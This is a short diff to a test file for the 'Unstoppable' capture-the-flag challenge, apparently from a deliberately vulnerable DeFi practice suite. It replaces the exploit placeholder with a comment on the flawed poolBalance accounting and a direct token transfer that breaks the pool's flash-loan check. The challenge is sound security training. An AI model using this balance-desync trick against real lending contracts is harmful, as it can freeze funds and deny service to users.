@@ -39,7 +39,14 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // UnstoppableLender relies on poolBalance variable to track
+        // it's DVL token balance which is incorrect as it's balance
+        // can be changed outside of depositTokens(uint256) function
+
+        await this.token.transfer(
+            this.pool.address,
+            ethers.utils.parseEther('1')
+        );
     });
 
     after(async function () {
